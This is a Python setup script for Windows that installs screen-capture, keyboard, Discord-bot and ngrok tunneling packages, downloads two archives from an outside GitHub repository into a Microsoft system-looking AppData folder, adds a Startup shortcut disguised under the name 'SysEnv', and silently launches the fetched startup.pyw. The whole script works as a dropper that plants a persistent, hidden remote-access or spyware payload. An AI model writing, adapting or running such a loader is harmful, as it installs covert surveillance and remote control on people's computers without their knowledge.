import os
import subprocess
import sys
import time
import zipfile
from pathlib import Path

required_packages = [
    'flask', 'flask-socketio', 'opencv-python-headless', 'numpy', 'mss',
    'pyautogui', 'Pillow', 'nextcord', 'requests',
    'keyboard', 'python-dateutil', 'pywin32', 'pypiwin32', "pyngrok"
]

required_package = [
    'setuptools'
]

def install_package():
    for package in required_package:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])


def install_packages():
    for package in required_packages:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])

install_package()
install_packages()

time.sleep(3)

import requests
import win32com.client

user_profile = os.environ['USERPROFILE']
target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
os.makedirs(target_path, exist_ok=True)

r = requests.get("https://github.com/skibidi-123456/skibidi/archive/refs/heads/main.zip", allow_redirects=True)
file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-main.zip')
open(file_path, 'wb').write(r.content)
with zipfile.ZipFile(file_path, 'r') as zip_ref:
    zip_ref.extractall(target_path)
os.remove(file_path)

r = requests.get("https://github.com/skibidi-123456/skibidi/archive/refs/heads/startup.zip", allow_redirects=True)
file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-startup.zip')
open(file_path, 'wb').write(r.content)
with zipfile.ZipFile(file_path, 'r') as zip_ref:
    zip_ref.extractall(target_path)
os.remove(file_path)

def add_to_startup(script_path=os.path.join(target_path, 'skibidi-startup', 'startup.pyw'), shortcut_name="SysEnv"):

    if script_path is None:
        script_path = sys.argv[0]

    startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"

    startup_dir.mkdir(parents=True, exist_ok=True)


    shortcut_path = startup_dir / f"{shortcut_name}.lnk"

    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(str(shortcut_path))
    shortcut.TargetPath = sys.executable
    shortcut.Arguments = f'"{script_path}"'
    shortcut.WorkingDirectory = str(Path(script_path).parent)
    shortcut.IconLocation = str(script_path)
    shortcut.save()

add_to_startup()

subprocess.Popen(["pythonw", os.path.join(target_path, "skibidi-startup", "startup.pyw")])